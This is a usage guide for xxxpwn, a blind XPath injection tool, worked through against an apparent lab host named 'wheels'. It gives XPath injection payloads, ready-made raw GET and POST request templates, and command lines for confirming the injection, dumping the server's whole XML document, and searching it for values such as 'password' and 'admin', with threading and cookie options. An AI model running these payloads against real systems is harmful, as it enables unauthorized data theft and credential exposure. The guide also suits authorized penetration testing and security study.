# xxxpwn Usage Guide

xxxpwn performs blind XPath injection using a Binary Search Tree (BST) approach.
Instead of returning data directly, it asks the server a series of true/false
questions — "is the first character of this node's name less than 'm'?" — and
narrows down the answer with each request.

---

## Quickstart: injecting into `work`

Target: `http://wheels/portal.php?work=car&action=search`

The `work` parameter is injectable. A normal request looks like:

```
GET /portal.php?work=car&action=search HTTP/1.1
Host: wheels

```

To inject, you need to break out of the current XPath string context and append
your own boolean expression. A typical GET parameter injection suffix is:

```
' or INJECT and '1'='1
```

Substituting `INJECT` with something always-true (`1=1`) should produce the same
response as a valid search. Substituting something always-false (`0=1`) should
produce a different response (empty result, error, redirect, etc.).

### 1. Create the inject file

Save this as `inject_wheels.txt`:

```
GET /portal.php?work=car'+or+$INJECT+and+'1'='1&action=search HTTP/1.1
Host: wheels

```

`$INJECT` is the placeholder xxxpwn replaces on every request.
The `+` signs are URL-encoded spaces (required for GET parameters).

> **Note:** If the parameter is URL-decoded before XPath evaluation you may need
> `-U` to URL-encode the injected payload as well. Test both.

### 2. Find your match string

Run a normal request in your browser or with curl and identify a string that
appears in the **successful** response but not in an error/empty response.
For example, if a successful search returns a page containing the word `result`:

```
-m "result"
```

### 3. Verify the injection point

```bash
xxxpwn -i inject_wheels.txt -m "result" wheels 80
```

xxxpwn automatically runs two sanity checks before doing anything:

| Test | XPath injected | Expected |
|------|---------------|----------|
| True injection | `count(//*) and 2>1` | match found |
| False injection | `0>1` | no match |

If either check fails, xxxpwn exits with an error. Common fixes:

- Add `-U` if the parameter is double-encoded
- Add `-H` if the payload is in an HTML/XML body (e.g. SOAP)
- Adjust the injection syntax in your inject file

### 4. Dump the full XML document

```bash
xxxpwn -i inject_wheels.txt -m "result" wheels 80
```

xxxpwn walks the entire XML tree and prints it incrementally to stdout as it
discovers it, then pretty-prints the full document at the end.

---

## Common scenarios

### HTTPS target

```bash
xxxpwn -s -i inject_wheels.txt -m "result" wheels 443
```

### Speed up extraction with threads

Each thread finds one character concurrently. 4–8 threads is a good starting point.

```bash
xxxpwn -t 4 -i inject_wheels.txt -m "result" wheels 80
```

### Search for a specific value without dumping everything

Useful when you already know what you're looking for (usernames, passwords, etc.).

```bash
xxxpwn --search "password" -i inject_wheels.txt -m "result" wheels 80
xxxpwn --search "admin"    -i inject_wheels.txt -m "result" wheels 80
```

Returns every node name, attribute name, attribute value, comment, and text node
that contains the search string.

### Inject session cookies

If the endpoint requires authentication:

```bash
# cookies.txt
PHPSESSID=abc123
auth=bearer_token_here
```

```bash
xxxpwn -C cookies.txt -i inject_wheels.txt -m "result" wheels 80
```

### Reduce requests with optimizations

`-g` counts all nodes globally up front (costs a few requests but skips
per-node zero-checks later). `-o` probes which characters actually appear in
the document and shrinks the BST search space. `-x` matches node names against
previously seen names instead of re-extracting them character by character.

```bash
xxxpwn -gnox -t 4 -i inject_wheels.txt -m "result" wheels 80
```

| Flag | What it does |
|------|-------------|
| `-g` | Global node count (skip zero-checks mid-tree) |
| `-n` | Normalize whitespace in node values |
| `-o` | Optimize character set globally and per long string |
| `-x` | Match node names against previously recovered names |

### Lowercase-only targets

If the XML uses only lowercase node names and values, strip uppercase from the
character set and use XPath `translate()` for comparisons — roughly halves the
number of requests:

```bash
xxxpwn -l -i inject_wheels.txt -m "result" wheels 80
```

### Start at a specific node

If you already know part of the tree structure:

```bash
xxxpwn --start_node "/*[1]/*[2]" -i inject_wheels.txt -m "result" wheels 80
```

### Test a payload interactively

Use `-e` to fire a single injection and see the full request/response:

```bash
xxxpwn -e "1=1" -i inject_wheels.txt -m "result" wheels 80
xxxpwn -e "0=1" -i inject_wheels.txt -m "result" wheels 80
```

---

## POST / SOAP targets

For POST bodies, include the full request in your inject file and add `-H` to
HTML-encode the payload (required when `$INJECT` sits inside an XML body):

```
POST /portal.php HTTP/1.1
Host: wheels
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

work=car'+or+$INJECT+and+'1'='1&action=search
```

```bash
xxxpwn -H -t 4 -i inject_wheels_post.txt -m "result" wheels 80
```

xxxpwn automatically recalculates `Content-Length` on every request.

---

## Full flag reference

```
xxxpwn [OPTIONS] <HOST> <PORT>

Required:
  -i, --inject <FILE>      Inject template file (must contain $INJECT)
  -m, --match  <PATTERN>   Regex matched against the response to detect true

Connection:
  -s, --ssl                Use TLS
  -C, --cookies <FILE>     Cookie file (one name=value per line, # for comments)

Encoding:
  -U, --urlencode          URL-encode the injected payload
  -H, --htmlencode         HTML-encode the injected payload

Optimizations:
  -t, --threads <N>        Parallel character discovery threads (default: 0)
  -l, --lowercase          Assume target is lowercase-only
  -g, --global_count       Count all nodes up front
  -n, --normalize_space    Normalize whitespace
  -o, --optimize_charset   Shrink character set to only chars present in doc
  -x, --xml_match          Match node names against previously seen names

Scope:
  --no_root                Skip root-level comments/PIs
  --no_comments            Skip comment nodes
  --no_processor           Skip processing-instruction nodes
  --no_attributes          Skip attributes
  --no_values              Skip attribute values
  --no_text                Skip text nodes
  --no_child               Skip child nodes

BST tuning:
  --len_low  <N>           Low bound for string-length BST (default: 0)
  --len_high <N>           High bound for string-length BST (default: 16)
  --start_node <XPATH>     Start recovery at this node (default: /*[1])
  -u, --use_characters <S> Custom character set string

Search / test:
  --search <STRING>        Search all node types for string, then exit
  --search_start           Use starts-with instead of contains for --search
  -e, --example <PAYLOAD>  Fire one test injection and show request/response
  --summary                Print XML summary counts only, no content
  --xpath2                 Check if target supports XPath 2.0
  --unicode                Add extended Latin chars to search space
  -c, --case               Case-sensitive match (default: insensitive)
```
